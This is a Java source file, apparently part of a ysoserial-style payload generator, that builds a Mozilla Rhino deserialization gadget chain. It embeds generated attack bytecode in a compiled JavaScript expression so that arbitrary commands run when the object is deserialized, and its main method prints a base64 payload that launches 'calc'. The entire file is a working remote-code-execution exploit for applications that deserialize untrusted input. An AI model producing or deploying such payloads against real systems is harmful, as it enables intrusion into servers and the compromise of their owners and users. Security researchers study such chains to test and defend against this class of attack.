package cn.butler.yso.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.thirdparty.config.ThirdPartyConfig;
import cn.butler.thirdparty.payloads.expression.JSExpression;
import cn.butler.yso.config.SuidRewriteOutputStream;
import cn.butler.yso.payloads.util.Reflections;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.Hashtable;
import java.util.Map;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.mozilla.javascript.Callable;
import org.mozilla.javascript.ClassCache;
import org.mozilla.javascript.Context;
import org.mozilla.javascript.ErrorReporter;
import org.mozilla.javascript.Evaluator;
import org.mozilla.javascript.IdScriptableObject;
import org.mozilla.javascript.Interpreter;
import org.mozilla.javascript.LazilyLoadedCtor;
import org.mozilla.javascript.NativeJavaObject;
import org.mozilla.javascript.Script;
import org.mozilla.javascript.Scriptable;
import org.mozilla.javascript.ScriptableObject;
import org.mozilla.javascript.tools.shell.Environment;

public class MozillaRhino3 implements ObjectPayload {
    @Override
    public Object getObject( String command) throws Exception {
//        command = "calc";
//        command = "var rt= new java.lang.ProcessBuilder(); rt.command('" + command + "');rt.start();";

        String jsExpression = "";
        String[] parts = command.split(":", 2); // 使用第一个冒号进行切割，限制切割为最多两个部分
        String jdkversion = parts[0];
        command = parts[1];

        //字节码生成
        Object[] objects = (Object [])ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",command);
        //js Engine处理
        if (jdkversion.equals("jdk6")){
            jsExpression = JSExpression.unsafeExpressModifyByJdk6((byte[]) objects[1]);
        }else {
            jsExpression = JSExpression.unsafeExpressModify((byte[]) objects[1]);

        }

        Class<?> nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
        Constructor<?> nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
        Reflections.setAccessible(nativeErrorConstructor);
        IdScriptableObject idScriptableObject = (IdScriptableObject) nativeErrorConstructor.newInstance();

        ScriptableObject dummyScope = new Environment();
        Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
        associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
        Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);
        Context context = Context.enter();

        Object initContextMemberBox = Reflections.createWithConstructor(
            Class.forName("org.mozilla.javascript.MemberBox"),
            (Class<Object>) Class.forName("org.mozilla.javascript.MemberBox"),
            new Class[]{Method.class},
            new Object[]{Context.class.getMethod("enter")});

        ScriptableObject scriptableObject = new Environment();

        (new ClassCache()).associate(scriptableObject);
        try {
            Constructor ctor1 = LazilyLoadedCtor.class.getDeclaredConstructors()[1];
            ctor1.setAccessible(true);
            ctor1.newInstance(scriptableObject, "java",
                "org.mozilla.javascript.NativeJavaTopPackage", false, true);
        } catch (ArrayIndexOutOfBoundsException e) {
            Constructor ctor1 = LazilyLoadedCtor.class.getDeclaredConstructors()[0];
            ctor1.setAccessible(true);
            ctor1.newInstance(scriptableObject, "java",
                "org.mozilla.javascript.NativeJavaTopPackage", false);
        }


        Interpreter interpreter = new Interpreter();
        Method mt = Context.class.getDeclaredMethod("compileString", String.class, Evaluator.class, ErrorReporter.class, String.class, int.class, Object.class);
        mt.setAccessible(true);
        Script script = (Script) mt.invoke(context, new Object[]{jsExpression, interpreter, null, "test", 0, null});

        Constructor<?> ctor = Class.forName("org.mozilla.javascript.NativeScript").getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        Object nativeScript = ctor.newInstance(script);
        Method setParent = ScriptableObject.class.getDeclaredMethod("setParentScope", Scriptable.class);
        setParent.invoke(nativeScript, scriptableObject);

        try {
            //1.7.13
            Method makeSlot = ScriptableObject.class.getDeclaredMethod("findAttributeSlot", String.class, int.class, Class.forName("org.mozilla.javascript.ScriptableObject$SlotAccess"));
            Object getterEnum = Class.forName("org.mozilla.javascript.ScriptableObject$SlotAccess").getEnumConstants()[3];
            Reflections.setAccessible(makeSlot);
            Object slot = makeSlot.invoke(idScriptableObject, "getName", 0, getterEnum);
            Reflections.setFieldValue(slot, "getter", initContextMemberBox);
        } catch (ClassNotFoundException e) {
            try {
                //1.7R2
                Method makeSlot = ScriptableObject.class.getDeclaredMethod("findAttributeSlot", String.class, int.class, int.class);
                Reflections.setAccessible(makeSlot);
                Object slot = makeSlot.invoke(idScriptableObject, "getName", 0, 4);
                Reflections.setFieldValue(slot, "getter", initContextMemberBox);
            } catch (NoSuchMethodException ee) {
                //1.7.7.2
                Method makeSlot = ScriptableObject.class.getDeclaredMethod("createSlot", Object.class, int.class, int.class);
                Reflections.setAccessible(makeSlot);
                Object slot = makeSlot.invoke(idScriptableObject, "getName", 0, 4);
                Reflections.setFieldValue(slot, "getter", initContextMemberBox);
            }
        }

        idScriptableObject.setGetterOrSetter("directory", 0, (Callable) nativeScript, false);

        NativeJavaObject nativeJavaObject = new NativeJavaObject();
        Reflections.setFieldValue(nativeJavaObject, "parent", dummyScope);
        Reflections.setFieldValue(nativeJavaObject, "isAdapter", true);
        Reflections.setFieldValue(nativeJavaObject, "adapter_writeAdapterObject",
            this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));

        Reflections.setFieldValue(nativeJavaObject, "javaObject", idScriptableObject);

        return nativeJavaObject;
    }

    public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out) throws IOException {
        out.writeObject("java.lang.Object");
        out.writeObject(new String[0]);
        out.writeObject(javaObject);
    }

    public static void main(String[] args) throws Exception {
        String command = "jdk6:auto_cmd:calc";
        Object object = new MozillaRhino3().getObject(command);
        String suidBase64Serialization = SuidRewriteOutputStream.serializePayloadToBase64(object);
        System.out.println(suidBase64Serialization);
    }
}
